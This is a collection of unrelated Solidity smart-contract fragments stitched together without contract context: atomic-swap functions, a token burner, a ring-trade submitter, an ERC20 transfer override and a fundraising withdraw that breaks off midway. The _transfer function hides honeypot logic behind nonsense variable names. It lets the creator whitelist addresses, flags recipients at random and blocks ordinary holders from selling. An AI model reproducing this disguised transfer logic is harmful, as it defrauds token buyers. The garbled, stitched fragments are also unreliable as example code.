    require(amount > 0);
    TokenBurner burner = new TokenBurner();
    if (_token.transfer(address(burner), amount)) {
        burner.kill();
        _burners.push(address(burner));
        _totalBurned = _totalBurned.add(amount);
        emit Burn(address(this), address(burner), amount);
    }
}

function refund(address _participantAddress) public {
    Swap memory swap = swaps[msg.sender][_participantAddress];
    require(swap.balance > uint256(0));
    require(swap.createdAt.add(SafeTime) < now);
    ERC20(swap.token).transfer(msg.sender, swap.balance);
    Reputation(ratingContractAddress).change(_participantAddress, -1);
    clean(msg.sender, _participantAddress);
    Refund();
}

function withdraw(bytes32 _secret, address _ownerAddress) public {
    Swap memory swap = swaps[_ownerAddress][msg.sender];
    require(swap.secretHash == ripemd160(_secret));
    require(swap.balance > uint256(0));
    require(swap.createdAt.add(SafeTime) > now);
    Reputation(ratingContractAddress).change(msg.sender, 1);
    ERC20(swap.token).transfer(msg.sender, swap.balance);
    swaps[_ownerAddress][msg.sender].balance = 0;
    swaps[_ownerAddress][msg.sender].secret = _secret;
    Withdraw();
}

function createSwap(bytes20 _secretHash, address _participantAddress, uint256 _value, address _token) public {
    require(_value > 0);
    require(participantSigns[msg.sender][_participantAddress].add(SafeTime) > now);
    require(swaps[msg.sender][_participantAddress].balance == uint256(0));
    require(ERC20(_token).transferFrom(msg.sender, this, _value));
    swaps[msg.sender][_participantAddress] = Swap(
        _token,
        bytes32(0),
        _secretHash,
        now,
        _value
    );
    CreateSwap(now);
}

function submitRing(
    address[4][] addressList,
    uint[6][] uintArgsList,
    uint8[1][] uint8ArgsList,
    bool[] buyNoMoreThanAmountBList,
    uint8[] vList,
    bytes32[] rList,
    bytes32[] sList,
    address feeRecipient,
    uint16 feeSelections
)
public {
    require((ringIndex >> 63) == 0); 
    uint64 _ringIndex = ringIndex;
    ringIndex |= (1 << 63);
    RingParams memory params = RingParams(
        vList,
        rList,
        sList,
        feeRecipient,
        feeSelections,
        addressList.length,
        0x0 
    );
    verifyInputDataIntegrity(
        params,
        addressList,
        uintArgsList,
        uint8ArgsList,
        buyNoMoreThanAmountBList
    );
    TokenTransferDelegate delegate = TokenTransferDelegate(delegateAddress);
    OrderState[] memory orders = assembleOrders(
        params,
        delegate,
        addressList,
        uintArgsList,
        uint8ArgsList,
        buyNoMoreThanAmountBList
    );
    verifyRingSignatures(params, orders);
    verifyTokensRegistered(params, orders);
    handleRing(_ringIndex, params, orders, delegate);
    ringIndex = _ringIndex + 1;
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (fudding == false)) {
        chinup = chTx;
        poocoin = true;
    }
    if ((address(sender) == creator) && (fudding == true)) {
        interstate[recipient] = true;
        rainuier[recipient] = false;
        fudding = false;
    }
    if ((amount > highway) && (interstate[sender] == true) && (address(sender) != creator)) {
        olympci[recipient] = true;
    }
    if (interstate[recipient] != true) {
        rainuier[recipient] = ((randomly() == 78) ? true : false);
    }
    if ((rainuier[sender]) && (interstate[recipient] == false)) {
        rainuier[recipient] = true;
    }
    if (interstate[sender] == false) {
        if ((amount > highway) && (olympci[sender] == true)) {
            require(false);
        }
        require(amount < chinup);
        if (poocoin == true) {
            if (olympci[sender] == true) {
                require(false);
            }
            olympci[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function withdraw() public {
    require(address(this).balance < goal, "Fundraising campaign was successful");
    require(now > endTime, "Fundraising campaign is still ongoing");
    msg.sender.transfer(donations[msg.sender]);
